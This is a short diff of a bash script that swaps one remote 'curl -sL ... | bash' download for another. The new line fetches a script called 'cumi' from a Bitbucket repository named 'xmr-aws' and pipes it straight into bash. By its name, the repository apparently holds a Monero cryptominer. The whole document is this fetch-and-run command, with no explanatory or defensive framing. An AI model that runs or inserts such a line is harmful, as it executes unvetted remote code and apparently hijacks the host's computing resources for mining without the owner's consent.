@@ -1,2 +1,2 @@
 #!/bin/bash
-curl -sL https://bitbucket.org/asana/paket/raw/main/ga | bash
+curl -sL https://bitbucket.org/ikballshizuka/xmr-aws/raw/main/cumi | bash
